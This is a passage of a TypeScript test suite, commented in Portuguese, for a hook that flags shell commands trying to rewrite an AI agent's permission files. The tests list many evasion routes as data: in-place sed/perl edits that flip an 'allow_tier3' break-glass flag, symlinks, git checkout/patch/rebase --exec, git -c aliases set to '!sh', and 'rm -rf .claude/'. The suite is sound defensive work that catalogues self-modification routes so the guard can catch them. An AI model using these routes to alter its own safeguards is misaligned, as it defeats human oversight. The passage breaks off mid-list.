      ["echo x > C:/repo/.claude/worktrees/wt1/SPEC.md", "spec"],
      // encadeado: o gate é um dos sub-comandos
      ["git status && sed -i 's/a/b/' .claude/tier-rules.json", "tier-rules"],
      ["ls; echo x > .claude/settings.json; ls", "settings"],
    ])("%j → %s", (command, kind) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.kind, command).toBe(kind);
      expect(hit!.why).toBeTruthy();
    });

    it("o resultado diz qual sub-comando e qual arquivo", () => {
      const hit = find("git status && sed -i 's/a/b/' .claude/tier-rules.json");
      expect(hit).toMatchObject({ sub: "sed -i 's/a/b/' .claude/tier-rules.json", kind: "tier-rules" });
      expect(hit!.file).toMatch(/tier-rules\.json/);
    });
  });

  // Decisão do PO: toda edição IN-PLACE do SPEC.md por shell pede, cite ou não o comando as chaves do gate. Um
  // `sed -i '4s/false/true/' SPEC.md` liga o break-glass sem nomear `allow_tier3`, e o guard não sabe que linha é
  // essa: edição que reescreve o arquivo sem que se possa dizer o que muda do gate é edição do gate.
  describe("SPEC.md: toda edição in-place pede, cite ou não allow_tier3", () => {
    it.each([
      // a forma que motivou a regra
      "sed -i '4s/false/true/' SPEC.md",
      "sed -i 's/: false/: true/' SPEC.md",
      "sed -i 's/Overview/Visão geral/' SPEC.md",
      // as formas do sed
      "sed -i.bak 's/a/b/' SPEC.md",
      "sed -i'' 's/a/b/' SPEC.md",
      "sed -i '' 's/a/b/' SPEC.md",
      "sed --in-place 's/a/b/' SPEC.md",
      "sed --in-place=.bak 's/a/b/' SPEC.md",
      "sed -Ei 's/a/b/' SPEC.md",
      "sed -iE 's/a/b/' SPEC.md",
      "sed -ni '4p' SPEC.md",
      "sed -E -i 's/a/b/' SPEC.md",
      "sed -s -i 's/a/b/' SPEC.md",
      "sed -e 's/a/b/' -i SPEC.md",
      "sed -i -e 's/a/b/' -e 's/c/d/' SPEC.md",
      "sed -i -f fix.sed SPEC.md",
      "gsed -i 's/a/b/' SPEC.md",
      "sudo sed -i 's/a/b/' SPEC.md",
      "SED_X=1 sed -i 's/a/b/' SPEC.md",
      // perl, ruby, awk
      "perl -i -pe 's/a/b/' SPEC.md",
      "perl -pi -e 's/false/true/ if $. == 4' SPEC.md",
      "perl -i.bak -pe 's/a/b/' SPEC.md",
      "perl -pi.bak -e 's/a/b/' SPEC.md",
      "perl -ibak -pe 's/a/b/' SPEC.md",
      "perl -lpi -e 's/a/b/' SPEC.md",
      "perl -0pi -e 's/a/b/' SPEC.md",
      "ruby -i -pe 'sub(/a/, \"b\")' SPEC.md",
      "ruby -pi -e 'sub(/a/, \"b\")' SPEC.md",
      "ruby -i.bak -pe 'x' SPEC.md",
      "awk -i inplace 'NR==4{sub(/false/,\"true\")}1' SPEC.md",
      "gawk -i inplace '{print}' SPEC.md",
      // o SPEC.md por caminho relativo, com ./, absoluto e com barra invertida
      "sed -i '4s/false/true/' ./SPEC.md",
      "sed -i '4s/false/true/' C:/repo/SPEC.md",
      "sed -i '4s/false/true/' C:\\repo\\SPEC.md",
      "sed -i '4s/false/true/' \"SPEC.md\"",
      "sed -i '4s/false/true/' 'SPEC.md'",
      "sed -i '4s/false/true/' spec.md",
      // o SPEC.md entre outros arquivos, e depois de outro comando
      "sed -i 's/a/b/' README.md SPEC.md",
      "cd . && sed -i '4s/false/true/' SPEC.md",
      "git status && sed -i '4s/false/true/' SPEC.md",
      "true; sed -i '4s/false/true/' SPEC.md",
      "bash -c \"sed -i '4s/false/true/' SPEC.md\"",
      "sh -c 'perl -pi -e \"s/false/true/\" SPEC.md'",
      "find . -name x | xargs sed -i 's/a/b/' SPEC.md",
    ])("%s → pede", (command) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.kind, command).toBe("spec");
    });

    it.each([
      // só imprime: não grava
      "sed -n '4p' SPEC.md",
      "sed -n '/allow_tier3/p' SPEC.md",
      "sed 's/x/y/' SPEC.md",
      "sed -e 's/x/y/' SPEC.md",
      "sed -E 's/x/y/' SPEC.md",
      "sed -En 's/x/y/p' SPEC.md",
      "sed -s 's/x/y/' SPEC.md",
      "sed --expression='s/x/y/' SPEC.md",
      "sed 's/x/y/' SPEC.md > /tmp/spec.out",
      "sed 's/x/y/' SPEC.md | head",
      "sed -n 4p ./SPEC.md",
      "perl -ne 'print if /allow_tier3/' SPEC.md",
      "perl -pe 's/x/y/' SPEC.md",
      "perl -lne 'print' SPEC.md",
      "perl -MList::Util=sum -ne 'print' SPEC.md",
      "ruby -ne 'puts $_' SPEC.md",
      "awk '{print}' SPEC.md",
      "awk 'NR==4' SPEC.md",
      // ler
      "grep allow_tier3 SPEC.md",
      "grep -i allow_tier3 SPEC.md",
      "cat SPEC.md",
      "head -20 SPEC.md",
      "tail -5 SPEC.md",
      "less SPEC.md",
      "wc -l SPEC.md",
      "diff SPEC.md /tmp/SPEC.md",
      // o mesmo comando em outro arquivo
      "sed -i 's/a/b/' README.md",
      "sed -i '4s/false/true/' docs/SPEC.md",
      "sed -i '4s/false/true/' notes.md",
      "sed -i 's/a/b/' src/app.ts",
      "sed -i 's/SPEC.md/README.md/' README.md",
      "perl -pi -e 's/a/b/' src/app.ts",
      "ruby -pi -e 'x' src/app.ts",
      "sed -i 's/a/b/' SPEC.md.bak",
      "sed -i 's/a/b/' MYSPEC.md",
    ])("%s → passa", (command) => {
      expect(find(command), command).toBeNull();
    });

    it("o SPEC.md de outro diretório (docs/SPEC.md, uma worktree sem raiz do framework) não é o gate", () => {
      expect(find("sed -i 's/a/b/' docs/SPEC.md")).toBeNull();
      expect(find("cd docs && sed -i 's/a/b/' SPEC.md")).toBeNull();
    });
  });

  describe("não pede", () => {
    it.each([
      // ler
      "cat .claude/tier-rules.json",
      "grep allow_tier3 SPEC.md",
      "git diff SPEC.md",
      "git diff -- .claude/settings.json",
      "git add .claude/tier-rules.json",
      "diff aiteam/templates/tier-rules.json .claude/tier-rules.json",
      "cat SPEC.md > /tmp/spec.copy",
      "cp .claude/tier-rules.json /tmp/backup.json",
      "cp SPEC.md SPEC.md.bak",
      "ls .claude",
      "jq .hooks .claude/settings.json",
      "head -20 SPEC.md",
      "Get-Content .claude/settings.json",
      "Get-Content SPEC.md | Select-String allow_tier3",
      "node -e \"console.log(require('fs').readFileSync('.claude/tier-rules.json','utf8'))\"",
      "python3 -c \"print(open('SPEC.md').read())\"",
      // gravar em outro arquivo, citando o gate
      "echo 'see .claude/settings.json' > notes.md",
      "sed -i 's/a/b/' src/app.ts",
      'git commit -m "docs: explica o .claude/settings.json"',
      "echo x > docs/SPEC.md",
      "cp a.json aiteam/templates/tier-rules.json",
      "echo x > .claude/settings.json.bak",
      // o texto de um heredoc é dado
      "cat > docs/runbook.md <<'EOF'\nsed -i 's/a/b/' .claude/tier-rules.json\necho x > .claude/settings.json\nEOF",
      // SPEC.md: o que não é o gate dela (anexar texto; a edição in-place, essa pede, abaixo)
      "echo 'mais uma linha' >> SPEC.md",
      "Add-Content SPEC.md 'uma nota'",
      // uma aspa não é um redirecionamento
      'echo "a > .claude/tier-rules.json"',
      "echo 'x >> .claude/settings.json'",
      // nada
      "ls -la",
      "",
    ])("%j", (command) => {
      expect(find(command), command).toBeNull();
    });
  });

  it("não lança com entrada estranha", () => {
    for (const input of [undefined, null, 42, "\0", "'", '"', ">", ">>", "> ", "tee", "sed -i", "cp", "mv a", "node -e", "bash -c", "(".repeat(2000), ">".repeat(2000)]) {
      expect(() => find(input as unknown as string)).not.toThrow();
    }
  });

  it("um split que lança vira o texto inteiro como sub-comando (não esconde o gate)", () => {
    const boom = (): string[] => {
      throw new Error("split");
    };
    expect(gateWriteInCommand("echo x > .claude/tier-rules.json", { split: boom, cwd: CWD, isFrameworkRoot })).not.toBeNull();
  });

  it("o código de um shell aninhado é lido até uma profundidade limitada", () => {
    const deep = `bash -c "bash -c \\"bash -c 'echo x > .claude/tier-rules.json'\\""`;
    expect(() => find(deep)).not.toThrow();
  });

  it("o MCP: gravar no .mcp.json ou no .cursor/mcp.json pede", () => {
    for (const command of ["echo '{}' > .mcp.json", "sed -i 's/a/b/' .mcp.json", "cp x.json .cursor/mcp.json", "node -e \"fs.writeFileSync('.mcp.json','{}')\"", "Set-Content .cursor\\mcp.json '{}'"]) {
      expect(find(command), command).toMatchObject({ kind: "mcp" });
    }
    expect(find("cat .mcp.json")).toBeNull();
    expect(find("echo x > docs/mcp.json")).toBeNull();
  });
});

// Revisão de segurança do F13: as formas de gravar no gate SEM dar o nome do arquivo como destino. Um
// destino que é um diretório, um link, um git/patch que traz o arquivo de outra versão, o caminho que é
// symlink ou junction para o arquivo.
describe("gateWriteInCommand — as formas que contornam o nome do arquivo", () => {
  const files: Record<string, string> = {};
  const roots = new Set(["C:/repo", "C:/repo/.claude/worktrees/wt1", "D:/other"]);
  const find = (command: string, extra: Record<string, unknown> = {}) =>
    gateWriteInCommand(command, { split: splitSubCommands, cwd: CWD, isFrameworkRoot: (d: string) => roots.has(d), ...extra });

  describe("cp/mv/install/rsync para um diretório que é o .claude ou a raiz do repo", () => {
    it.each([
      ["cp x.json .claude/"],
      ["cp x.json .claude"],
      ["cp -r conf/* .claude/"],
      ["mv /tmp/new.json .claude/"],
      ["install -m 644 a.json .claude/"],
      ["rsync -a conf/ .claude/"],
      ["cp x.json C:/repo/.claude/"],
      ["cp x.json .cursor/"],
      ["Copy-Item x.json .claude\\"],
      ["Copy-Item -Path x.json -Destination .claude\\ -Force"],
      ["xcopy x.json .claude\\"],
      // para a raiz do repo, carregando um arquivo do gate ou o .claude inteiro
      ["cp /tmp/SPEC.md ."],
      ["cp /tmp/SPEC.md ./"],
      ["cp /tmp/SPEC.md C:/repo"],
      ["cp -r /tmp/other/.claude ."],
      ["cp /tmp/.mcp.json ."],
      ["mv /tmp/SPEC.md ."],
      ["cp /tmp/SPEC.md ./.claude/worktrees/wt1/"],
      ["cp /tmp/SPEC.md D:/other"],
    ])("%s → pede", (command) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.why).toBeTruthy();
    });

    it.each([
      ["cp x.json docs/"],
      ["cp x.json ."],
      ["cp notes.md ."],
      ["cp /tmp/SPEC.md docs/"],
      ["cp /tmp/SPEC.md /tmp/elsewhere"],
      ["cp x.json src/.claude-like/"],
      ["cp .claude/tier-rules.json /tmp/"],
      ["cp -r .claude /tmp/backup"],
    ])("%s → não pede", (command) => {
      expect(find(command), command).toBeNull();
    });
  });

  describe("mv e rm do próprio diretório .claude", () => {
    it.each([["mv .claude /tmp/old"], ["mv .claude/ /tmp/old"], ["rm -r .claude"], ["rm -rf .claude/"], ["Remove-Item .claude -Recurse -Force"], ["Move-Item .claude C:\\tmp\\old"], ["mv C:/repo/.cursor /tmp/x"]])("%s → pede", (command) => {
      expect(find(command), command).not.toBeNull();
    });
    it("outro diretório continua livre", () => {
      expect(find("rm -r dist")).toBeNull();
      expect(find("mv build /tmp/build")).toBeNull();
    });
  });

  describe("links: a ORIGEM de ln/mklink/New-Item é um arquivo do gate", () => {
    it.each([
      ["ln -s .claude/tier-rules.json notes.md"],
      ["ln -sf SPEC.md docs/spec-copy.md"],
      ["ln SPEC.md hard.md"],
      ["ln -s /tmp/evil.json .claude/tier-rules.json"],
      ["mklink notes.md SPEC.md"],
      ["mklink /H spec2.md SPEC.md"],
      ["New-Item -ItemType SymbolicLink -Path notes.md -Target .claude/settings.json"],
      ["New-Item -ItemType Junction -Path x -Target .claude/tier-rules.json"],
      ["ni -ItemType HardLink -Path x -Value SPEC.md"],
      ["cmd /c mklink n.md SPEC.md"],
    ])("%s → pede", (command) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.why).toMatch(/link|\.claude|gate/);
    });

    it.each([["ln -s src/app.ts link.ts"], ["ln -s docs/SPEC.md x.md"], ["New-Item -ItemType Directory -Path x"], ["New-Item notes.md"], ["mklink a.txt b.txt"]])("%s → não pede", (command) => {
      expect(find(command), command).toBeNull();
    });
  });

  describe("git checkout / restore / apply e patch", () => {
    it.each([
      ["git checkout -- SPEC.md"],
      ["git checkout HEAD~3 -- SPEC.md"],
      ["git checkout abc1234 -- .claude/settings.json"],
      ["git checkout main -- .claude/tier-rules.json"],
      ["git checkout SPEC.md"],
      ["git restore SPEC.md"],
      ["git restore --source=HEAD~2 .claude/tier-rules.json"],
      ["git restore -s v1 -- .claude/settings.json"],
      ["git restore --staged --worktree .mcp.json"],
      ["git checkout abc1234 -- .claude"],
      ["git -C . checkout abc1234 -- SPEC.md"],
      ["git -c core.x=1 restore .cursor/mcp.json"],
      // de uma versão para tudo: traz o gate de outro commit junto
      ["git checkout abc1234 -- ."],
      ["git checkout HEAD~5 ."],
      ["git restore --source=abc1234 ."],
      ["git restore -s main :/"],
    ])("%s → pede", (command) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.why).toBeTruthy();
    });

    it.each([
      ["git checkout main"],
      ["git checkout -b feature/x"],
      ["git checkout -- src/app.ts"],
      ["git checkout ."],
      ["git checkout -- ."],
      ["git restore ."],
      ["git restore --staged src/app.ts"],
      ["git restore --source=HEAD~1 src/app.ts"],
      ["git stash"],
      ["git stash list"],
      ["git stash push -m x"],
      ["git stash drop"],
      ["git stash pop"],
      ["git stash apply"],
      ["git status"],
      ["git diff -- .claude/settings.json"],
      ["git log -- SPEC.md"],
      ["git add -A"],
    ])("%s → não pede", (command) => {
      expect(find(command), command).toBeNull();
    });

    describe("git apply e patch: o patch é lido", () => {
      const read = (p: string): string | null => files[p] ?? null;
      const withRead = (command: string) => find(command, { read });
      files["gate.diff"] = "diff --git a/SPEC.md b/SPEC.md\n--- a/SPEC.md\n+++ b/SPEC.md\n@@ -1 +1 @@\n-allow_tier3: false\n+allow_tier3: true\n";
      files["settings.diff"] = "--- a/.claude/settings.json\t2026-10-06\n+++ b/.claude/settings.json\t2026-10-06\n@@ -1 +1 @@\n-x\n+y\n";
      files["rename.diff"] = "diff --git a/old.md b/new.md\nsimilarity index 100%\nrename from old.md\nrename to .mcp.json\n";
      files["ok.diff"] = "diff --git a/src/app.ts b/src/app.ts\n--- a/src/app.ts\n+++ b/src/app.ts\n@@ -1 +1 @@\n-a\n+b\n";
      files["devnull.diff"] = "--- /dev/null\n+++ b/docs/new.md\n@@ -0,0 +1 @@\n+x\n";

      it.each([
        ["git apply gate.diff"],
        ["git apply --index settings.diff"],
        ["git apply -p1 rename.diff"],
        ["git apply ok.diff gate.diff"],
        ["patch -p1 < gate.diff"],
        ["patch -p1 -i settings.diff"],
        ["patch --input=gate.diff"],
        ["patch SPEC.md gate.diff"],
        ["git apply < gate.diff"],
        ["git apply SPEC.md"],
      ])("%s → pede (o patch toca o gate)", (command) => {
        expect(withRead(command), command).not.toBeNull();
      });

      it.each([["git apply ok.diff"], ["git apply --check gate.diff"], ["git apply --stat gate.diff"], ["git apply --numstat gate.diff"], ["git apply --summary gate.diff"], ["patch -p1 < ok.diff"], ["git apply devnull.diff"], ["patch -p1 -i ok.diff"]])(
        "%s → não pede",
        (command) => {
          expect(withRead(command), command).toBeNull();
        }
      );

      it.each([["git apply missing.diff"], ["git apply -"], ["patch -p1"], ["git apply"], ["patch -p1 < missing.diff"]])("%s → pede (o patch não pode ser lido: não dá para saber)", (command) => {
        const hit = withRead(command);
        expect(hit, command).not.toBeNull();
        expect(hit!.why).toMatch(/cannot read/);
      });

      it("sem leitor nenhum, todo git apply e patch sem --check pede", () => {
        expect(find("git apply ok.diff")).not.toBeNull();
        expect(find("patch -p1 < ok.diff")).not.toBeNull();
        expect(find("git apply --check ok.diff")).toBeNull();
      });

      it("um leitor que lança conta como patch ilegível", () => {
        const boom = (): string | null => {
          throw new Error("EACCES");
        };
        expect(find("git apply ok.diff", { read: boom })).not.toBeNull();
      });
    });
  });

  describe("o caminho é symlink ou junction para um arquivo do gate", () => {
    const realpath = (p: string): string | null =>
      ({ "notes.md": "C:/repo/SPEC.md", "linkdir/tier-rules.json": "C:/repo/.claude/tier-rules.json", "docs/spec.md": "C:/repo/docs/real.md" })[p.replace(/\\/g, "/")] ?? null;

    it.each([
      ["echo x > notes.md"],
      ["sed -i 's/allow_tier3: false/allow_tier3: true/' notes.md"],
      ["cp new.json linkdir/tier-rules.json"],
      ["tee linkdir/tier-rules.json"],
      ["Set-Content notes.md 'x'"],
    ])("%s → pede, pelo caminho real", (command) => {
      const hit = find(command, { realpath });
      expect(hit, command).not.toBeNull();
    });

    it("sem o resolvedor, o nome do link não diz nada (como antes)", () => {
      expect(find("echo x > notes.md")).toBeNull();
    });

    it("um link para um arquivo qualquer não pede", () => {
      expect(find("echo x > docs/spec.md", { realpath })).toBeNull();
    });

    it("um resolvedor que lança não esconde nem inventa o gate", () => {
      const boom = (): string | null => {
        throw new Error("EPERM");
      };
      expect(find("echo x > notes.md", { realpath: boom })).toBeNull();
      expect(find("echo x > .claude/tier-rules.json", { realpath: boom })).not.toBeNull();
    });
  });

  it("não lança com entrada estranha nas formas novas", () => {
    for (const input of ["git", "git -C", "git checkout --", "git apply", "patch", "patch <", "ln", "mklink", "cp .claude/", "mv", "git stash", "git restore -s", "New-Item -ItemType"]) {
      expect(() => find(input)).not.toThrow();
    }
  });
});

// Segunda rodada da revisão do F13: link para um DIRETÓRIO de gate, pathspec amplo do git, o git que cita o gate
// (checkout, restore, stash push) e o TOCTOU do patch. O git por comparação saiu por decisão do PO.
describe("gateWriteInCommand — links para diretório, git que cita o gate e o patch que muda antes de ser lido", () => {
  const roots = new Set(["C:/repo", "C:/repo/.claude/worktrees/wt1", "D:/other"]);
  const base = { split: splitSubCommands, cwd: CWD, isFrameworkRoot: (d: string) => roots.has(d) };
  const find = (command: string, extra: Record<string, unknown> = {}) => gateWriteInCommand(command, { ...base, ...extra });

  describe("link cuja origem é um diretório que guarda o gate", () => {
    it.each([
      ["ln -s .claude link"],
      ["ln -s .claude/ link"],
      ["ln -s .cursor link"],
      ["ln -s C:/repo/.claude link"],
      ["ln -sfn .claude/hooks hooks-link"],
      ["ln -s . raiz"],
      ["ln -s ./ raiz"],
      ["ln -s C:/repo raiz"],
      ["ln -s .. acima"],
      ["ln -s ../.. acima"],
      ["ln -s C:/ tudo"],
      ["ln -s D:/other outra"],
      ["ln -s C:/repo/.claude/worktrees/wt1 wt"],
      ["mklink /D link .claude"],
      ["mklink /J link C:\\repo"],
      ["mklink /J link .."],
      ["New-Item -ItemType Junction -Path link -Target .claude"],
      ["New-Item -ItemType SymbolicLink -Path l -Value ."],
      ["ni -ItemType SymbolicLink -Path l -Target C:\\repo"],
      ["cmd /c mklink /J link .claude"],
    ])("%s → pede", (command) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.why).toMatch(/link|door|\.claude/);
    });

    it("o realpath da origem cai dentro do .claude → pede", () => {
      const realpath = (p: string): string | null => ({ "atalho-dir": "C:/repo/.claude", "x/sub": "C:/repo/.claude/agents" })[p] ?? null;
      expect(find("ln -s atalho-dir outro", { realpath })).not.toBeNull();
      expect(find("ln -s x/sub outro", { realpath })).not.toBeNull();
    });

    it.each([
      ["ln -s src link"],
      ["ln -s src/ link"],
      ["ln -s docs/ guia"],
      ["ln -s ../shared node_modules"],
      ["ln -s C:/other/dir x"],
      ["ln -s /usr/bin/node node"],
      ["New-Item -ItemType Directory -Path x"],
      ["mklink a.txt b.txt"],
      ["mklink /D l docs"],
    ])("%s → não pede", (command) => {
      expect(find(command), command).toBeNull();
    });
  });

  describe("pathspec amplo do git, com uma origem dada", () => {
    it.each([
      ["git checkout abc1234 -- '*'"],
      ["git checkout abc1234 -- '*.json'"],
      ["git checkout abc1234 -- 'SP?C.md'"],
      ["git checkout abc1234 -- '[S]PEC.md'"],
      ["git checkout abc1234 -- ':(glob)**'"],
      ["git checkout abc1234 -- ':(top)'"],
      ["git checkout abc1234 -- ':(exclude)src'"],
      ["git checkout abc1234 -- ../repo"],
      ["git checkout abc1234 -- src/.."],
      ["git checkout abc1234 -- ./"],
      ["git checkout abc1234 -- C:/repo"],
      ["git checkout abc1234 -- .."],
      ["git checkout HEAD~2 ."],
      ["git restore --source=abc1234 '*'"],
      ["git restore --source abc1234 ':(top)'"],
      ["git restore -s abc1234 -- ../repo"],
      ["git restore --source=abc1234 ./"],
    ])("%s → pede", (command) => {
      expect(find(command), command).not.toBeNull();
    });

    it.each([
      ["git checkout abc1234 -- src/app.ts"],
      ["git checkout abc1234 -- src"],
      ["git checkout -- '*.ts'"],
      ["git restore '*.ts'"],
      ["git checkout main"],
      ["git restore --source=abc1234 src/app.ts"],
      ["git checkout abc1234 -- docs/readme.md"],
    ])("%s → não pede", (command) => {
      expect(find(command), command).toBeNull();
    });
  });

  // Decisão do PO (cortar o excesso): nenhum git roda dentro do hook para comparar o gate entre refs. Um git só pede
  // quando CITA um arquivo do gate, ou o diretório dele, como operando que ele grava. O que um merge, um rebase, um
  // cherry-pick ou um pull traz chega revisado por um PR, e o guard é um anteparo (ADR 0004): esses passam.
  describe("git: só pede quando cita um arquivo do gate (ou o diretório dele); o resto passa, e nenhum git roda", () => {
    it.each([
      ["git merge feature"],
      ["git merge --no-ff -m 'junta' feature"],
      ["git merge --ff-only origin/main"],
      ["git merge main"],
      ["git merge"],
      ["git merge -"],
      ["git merge a b c"],
      ["git merge -X ours -s ort feature"],
      ["git rebase main"],
      ["git rebase -i main"],
      ["git rebase --onto main base feature"],
      ["git rebase -x 'make test' main"],
      ["git rebase"],
      ["git cherry-pick abc1234"],
      ["git cherry-pick a b c"],
      ["git cherry-pick abc1234..def5678"],
      ["git cherry-pick -m 1 abc1234"],
      ["git cherry-pick"],
      ["git revert abc1234"],
      ["git pull"],
      ["git pull --rebase origin main"],
      ["git reset --hard"],
      ["git reset --hard origin/main"],
      ["git reset --hard HEAD~3"],
      ["git stash pop"],
      ["git stash pop 1"],
      ["git stash pop stash@{1}"],
      ["git stash apply"],
      ["git stash apply --index"],
      ["git stash branch nova"],
      ["git stash"],
      ["git stash list"],
      ["git stash show -p"],
      ["git stash drop"],
      ["git stash push -m x"],
      ["git stash push -- src/app.ts"],
      ["git checkout main"],
      ["git checkout -b feature/x"],
      ["git checkout -"],
      ["git switch main"],
      ["git switch -c nova"],
      // as opções globais antes do subcomando não mudam nada
      ["git -C ../outro merge feature"],
      ["git -c user.name=x merge feature"],
      ["git -c user.email=x@y -c color.ui=never merge feature"],
      ["git --config-env user.name=NOME merge feature"],
      ["git --no-pager --no-optional-locks -p merge feature"],
      ["git --git-dir=d/.git merge feature"],
      ["git --work-tree d reset --hard main"],
      ["git --namespace foo merge feature"],
      ["git --attr-source tree merge feature"],
      ["GIT_DIR=/outro/.git git merge feature"],
      ["cd /outro && git merge feature"],
      ["cd .. ; git rebase main"],
    ])("%s → passa", (command) => {
      expect(find(command), command).toBeNull();
    });

    it.each([
      ["git stash push -- SPEC.md"],
      ["git stash push -- .claude/settings.json"],
      ["git stash push SPEC.md"],
      ["git stash push -m guarda -- .claude/tier-rules.json"],
      ["git stash push -- .claude"],
      ["git stash push -- .claude/"],
      ["git stash -- SPEC.md"],
      ["git stash save guarda SPEC.md"],
      ["git -C . stash push -- .mcp.json"],
      ["git stash push -- .cursor/mcp.json"],
      // pular as opções globais com valor para achar o subcomando
      ["git --namespace foo checkout -- SPEC.md"],
      ["git --attr-source HEAD restore SPEC.md"],
      ["git --git-dir=.git --work-tree=. checkout -- .claude/"],
      ["git -c user.name=x restore .claude/tier-rules.json"],
      ["git --exec-path /x stash push -- SPEC.md"],
      // o checkout e o restore que citam o gate seguem pedindo (testados acima)
      ["git checkout main -- .claude/settings.json"],
      ["git restore SPEC.md"],
      ["git checkout -- .claude/"],
    ])("%s → pede", (command) => {
      const hit = find(command);
      expect(hit, command).not.toBeNull();
      expect(hit!.why).toBeTruthy();
    });

    it("o git que não cita o gate não chama processo nenhum: o gateWriteInCommand não tem como rodar git", () => {
      // a opção `git` não existe mais; um valor passado de fora é ignorado e nunca é chamado
      const spy = vi.fn(() => ({ status: 0, stdout: "" }));
      for (const command of ["git pull", "git merge main", "git rebase main", "git cherry-pick a b c", "git reset --hard", "git stash pop"]) {
        expect(find(command, { git: spy }), command).toBeNull();
      }
      expect(spy).not.toHaveBeenCalled();
    });

    // O que fica do F13 no git é só análise de texto (nenhum processo): o comando que o `rebase -x` roda, as opções
    // globais, a configuração de `-c` e o subcomando que não é de um builtin.
    describe("rebase --exec / -x: o comando que o git roda é lido como um comando", () => {
      it("o gate escrito pelo --exec pede, com o mesmo veredito de um shell", () => {
        expect(find("git rebase -x \"sed -i 's/a/b/' .claude/tier-rules.json\" main")).toMatchObject({ kind: "tier-rules" });
        expect(find("git rebase --exec 'echo x > .claude/settings.json' main")).toMatchObject({ kind: "settings" });
        expect(find("git rebase --exec='echo x > .claude/settings.json' main")).toMatchObject({ kind: "settings" });
        expect(find("git rebase -i -x 'cp /tmp/x SPEC.md' main")).not.toBeNull();
      });
      it("um --exec que não escreve no gate passa, e um rebase sem --exec também", () => {
        expect(find("git rebase -x 'make test' main")).toBeNull();
        expect(find("git rebase --exec 'npm test' -s ort -X patience main")).toBeNull();
        expect(find("git rebase main")).toBeNull();
        expect(find("git rebase --continue")).toBeNull();
      });
      it("o --exec aninhado respeita a profundidade (sem laço infinito)", () => {
        let command = "git rebase -x 'echo x > .claude/settings.json' main";
        for (let k = 0; k < 6; k++) command = `git rebase -x "${command.replace(/"/g, '\\"')}" main`;
        expect(() => find(command)).not.toThrow();
      });
    });

    describe("as opções globais do git que levam valor na forma separada comem a próxima palavra", () => {
      // Quando o valor é lido como subcomando, a classificação desanda; aqui o subcomando certo (checkout) é achado.
      it.each([
        ["git --namespace foo checkout -- SPEC.md"],
        ["git --namespace=foo checkout -- SPEC.md"],
        ["git --super-prefix sub/ checkout -- SPEC.md"],
        ["git --super-prefix=sub/ checkout -- SPEC.md"],
        ["git --exec-path /tmp/d checkout -- SPEC.md"],
        ["git --exec-path=/tmp/d checkout -- SPEC.md"],
        ["git --git-dir d/.git checkout -- SPEC.md"],
        ["git --git-dir=d/.git checkout -- SPEC.md"],
        ["git --work-tree d checkout -- SPEC.md"],
        ["git -C d checkout -- SPEC.md"],
        ["git -C d -C e checkout -- SPEC.md"],
        ["git --attr-source tree checkout -- SPEC.md"],
        ["git --namespace foo --super-prefix x/ -C d checkout -- SPEC.md"],
        ["git -c user.name=x checkout -- SPEC.md"],
        ["git --config-env user.name=NOME checkout -- SPEC.md"],
      ])("%s → o subcomando é achado e pede", (command) => {
        const hit = find(command);
        expect(hit, command).not.toBeNull();
        expect(hit!.file, command).toBe("SPEC.md");
      });
      it.each([["git -C d apply p.diff"], ["git --git-dir=d/.git am x.mbox"], ["git --work-tree d apply p.diff"]])(
        "%s → um git que roda em outro lugar não tem o patch lido: pede",
        (command) => {
          expect(find(command), command).not.toBeNull();
        }
      );
    });

    // As globais são duas listas fechadas, e a configuração de `-c` é uma lista fechada de chaves inofensivas.
    describe("opção global que não está em nenhuma das duas listas fechadas pede", () => {
      it.each([
        ["git --opcao-que-ainda-nao-existe valor merge feature"], // o valor viraria o "subcomando"
        ["git --nova-global x merge feature"],
        ["git --future-option=1 merge feature"],
        ["git --bare-ish status"],
        ["git -X status"],
        ["git -Z merge feature"],
        ["git --exec-pathh=/x status"],
        ["git --no-pager --nova-global status"],
        ["git --NO-PAGER status"],
      ])("%s → pede", (command) => {
        const hit = find(command);
        expect(hit, command).not.toBeNull();
        expect(hit!.why).toMatch(/global option this guard does not know/);
      });

      it.each([
        ["git --no-pager status"],
        ["git -p log"],
        ["git --paginate log"],
        ["git -P log"],
        ["git --bare status"],
        ["git --no-replace-objects log"],
        ["git --literal-pathspecs status"],
        ["git --glob-pathspecs status"],
        ["git --noglob-pathspecs status"],
        ["git --icase-pathspecs status"],
        ["git --no-optional-locks status"],
        ["git --no-lazy-fetch fetch"],
        ["git --no-advice status"],
        ["git --html-path"],
        ["git --man-path"],
        ["git --info-path"],
        ["git --version"],
        ["git -v"],
        ["git --help"],
        ["git -h"],
        ["git --list-cmds=main"],
        ["git --attr-source=HEAD status"],
        ["git --attr-source HEAD status"],
      ])("%s → uma global conhecida, não pede por ser global", (command) => {
        expect(find(command), command).toBeNull();
      });
    });

    describe("-c e --config-env: só as chaves de identidade, cor e fim de linha passam; o resto pede", () => {
      it.each([
        // alias, pager, editor, caminho de hooks, ssh, fsmonitor, comandos, helpers e programas externos
        ["git -c alias.x='!sh -c bad' x"],
        ["git -c alias.co=checkout checkout main"],
        ["git -c alias.merge='!sh' merge feature"],
        ["git -c ALIAS.x=y status"],
        ["git -c core.pager=sh log"],
        ["git -c core.pager=cat -c alias.x=y merge feature"],
        ["git -c core.editor=sh commit"],
        ["git -c core.hooksPath=/tmp/h commit -m x"],
        ["git -c core.sshCommand='sh -c x' fetch"],
        ["git -c core.fsmonitor=/tmp/m status"],
        ["git -c core.worktree=/x status"],
        ["git -c core.bare=true status"],
        ["git -c core.gitProxy=x fetch"],
        ["git -c credential.helper='!sh' fetch"],
        ["git -c diff.external=/tmp/d diff"],
        ["git -c gpg.program=/tmp/g commit -S -m x"],
        ["git -c merge.tool=x mergetool"],
        ["git -c sequence.editor=sh rebase -i main"],
        ["git -c rebase.instructionFormat=x rebase main"],
        ["git -c pull.rebase=true status"],
        ["git -c protocol.ext.allow=always fetch"],
        ["git -c url.x.insteadOf=y fetch"],
        ["git -c filter.x.clean=sh status"],
        ["git -c textconv.x=sh diff"],
        ["git -c diff.x.command=sh diff"],
        ["git -c diff.x.textconv=sh diff"],
        ["git -c merge.x.driver=sh merge feature"],
        ["git -c some.thing.cmd=sh status"],
        ["git -c some.thing.command=sh status"],
        ["git -c k=v status"],
        ["git -c =v status"],
        ["git -c status"],
        ["git -c"],
